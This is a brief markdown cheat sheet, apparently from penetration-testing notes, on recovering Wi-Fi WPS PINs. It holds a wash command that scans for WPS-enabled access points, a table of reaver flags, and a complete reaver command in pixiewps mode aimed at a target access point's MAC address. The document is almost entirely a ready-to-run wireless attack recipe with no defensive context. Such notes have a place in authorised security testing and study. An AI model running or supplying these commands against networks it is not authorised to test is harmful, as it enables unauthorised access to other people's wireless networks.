# WPS Pin Recovery
- Scan for WPS enabled access points

```bash
wash -i wlan0mon
```

| Flag | Description |
| :--- | :---------------------------------------------- |
| -i   | interface                                       |
| -b   | BSSID                                           |
| -c   | channel                                         |
| -f   | fixed \(disable channel hopping\)               |
| -a   | auto detect best advanced options for target AP |
| -w   | mimic Windows 7 registrar                       |
| -v   | very verbose \( -vv for even more \)            |
| -K 1 | pixiewps mode enabled                           |

- Attack WPS with Reaver

```bash
reaver -i wlan0mon -b <AP MAC> -c 6 -f -a -w -vv -K 1
```